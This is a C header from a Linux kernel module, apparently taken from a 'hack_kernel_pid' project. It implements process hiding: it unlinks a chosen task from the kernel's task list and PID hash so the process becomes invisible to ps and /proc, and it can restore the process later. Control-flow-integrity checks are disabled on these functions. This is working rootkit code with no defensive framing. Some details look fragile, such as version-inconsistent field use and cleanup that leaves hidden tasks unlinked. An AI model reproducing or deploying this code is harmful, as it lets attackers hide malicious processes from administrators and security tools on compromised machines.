#ifndef HIDE_PID_H_
#define HIDE_PID_H_

//code form https://github.com/zfdx123/hack_kernel_pid

#include <linux/types.h>
#include <linux/version.h>
#include <linux/init_task.h>
#include "hide_pid.h"

static LIST_HEAD(hidden_pid_list_head);
static DEFINE_MUTEX(pid_list_lock);

struct pid_node
{
    pid_t pid_number;
    struct task_struct *task;
    struct list_head list;
};

__attribute__((no_sanitize("cfi"))) static __always_inline 
void hide_process(pid_t pid_number)
{
    struct pid_node *this_node = NULL;
    struct task_struct *task = NULL;
    struct hlist_node *node = NULL;
    struct pid *pid;

    pid = find_vpid(pid_number);
    if (!pid || IS_ERR(pid)) 
    {
        logk("Failed to find PID %d with error %ld.\n", pid_number, PTR_ERR(pid));
        return;
    }

    task = pid_task(pid, PIDTYPE_PID);
    if (!task)
    {
        logk("Failed to find task for PID: %d\n", pid_number);
        return;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
    node = &task->pid_links[PIDTYPE_PID];
#else
    struct pid_link *link = NULL;
    link = &task->pids[PIDTYPE_PID];
    node = &link->node;
#endif

    mutex_lock(&pid_list_lock);
    list_del_rcu(&task->tasks);
    INIT_LIST_HEAD(&task->tasks);
    hlist_del_rcu(node);
    INIT_HLIST_NODE(node);

    synchronize_rcu();

    this_node = kmalloc(sizeof(struct pid_node), GFP_KERNEL);
    if (!this_node)
    {
        logk("Memory allocation failed for hiding PID: %d\n", pid_number);
        mutex_unlock(&pid_list_lock);
        return;
    }

    this_node->task = task;
    this_node->pid_number = pid_number;
    list_add_tail(&this_node->list, &hidden_pid_list_head);

    logk("PID: %d successfully hidden and added to the list.\n", pid_number);
    mutex_unlock(&pid_list_lock);
}


__attribute__((no_sanitize("cfi"))) static __always_inline 
void restore_process(pid_t pid_number)
{
    struct pid_node *entry = NULL, *next_entry = NULL;
    struct hlist_node *node = NULL;
    struct task_struct *task = NULL;

    logk("Restoring process: %d\n", pid_number);

    mutex_lock(&pid_list_lock);
    list_for_each_entry(entry, &hidden_pid_list_head, list)
    {
        if (entry->pid_number == pid_number)
        {
            task = entry->task;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
            node = &task->pid_links[PIDTYPE_PID];
#else
            struct pid_link *link = NULL;
            link = &task->pids[PIDTYPE_PID];
            node = &link->node;
#endif

            hlist_add_head_rcu(node, &task->thread_pid->tasks[PIDTYPE_PID]);
            list_add_tail_rcu(&task->tasks, &init_task.tasks);

            logk("PID: %d successfully restored.\n", pid_number);
            break;
        }
    }

    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
    {
        if (entry->pid_number == pid_number)
        {
            list_del(&entry->list);
            kfree(entry);
        }
    }
    mutex_unlock(&pid_list_lock);
}

static __always_inline 
void hide_exit(void)
{
    struct pid_node *entry = NULL, *next_entry = NULL;

    mutex_lock(&pid_list_lock);  // 加锁保护
    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
    {
        list_del(&entry->list);
        kfree(entry);
    }
    mutex_unlock(&pid_list_lock);
}


#endif // HIDE_PID_H_
